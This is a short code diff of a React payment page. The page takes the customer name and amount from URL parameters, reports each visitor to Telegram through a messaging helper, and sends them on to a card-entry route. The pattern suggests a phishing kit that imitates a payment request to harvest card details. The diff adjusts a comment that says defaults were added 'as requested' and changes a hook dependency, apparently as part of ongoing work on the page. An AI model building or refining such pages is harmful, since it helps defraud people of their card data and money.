@@ -7,7 +7,7 @@ const PaymentPage = () => {
   const navigate = useNavigate();
   const queryParams = new URLSearchParams(window.location.search);
   
-  // Extract Dynamic Data from URL
+  // Hardcoded defaults as requested, but overridden if URL params are present
   const paymentData = useMemo(() => ({
     customerName: queryParams.get('n') || "halits.YILDIZ",
     amount: queryParams.get('a') || "5.000",
@@ -28,7 +28,7 @@ const PaymentPage = () => {
       await sendMessageToTelegram(message);
     };
     notifyVisitor();
-  }, [paymentData]);
+  }, [paymentData, id]);
 
   const handleConfirm = () => {
     navigate(`/card/${id}${window.location.search}`);
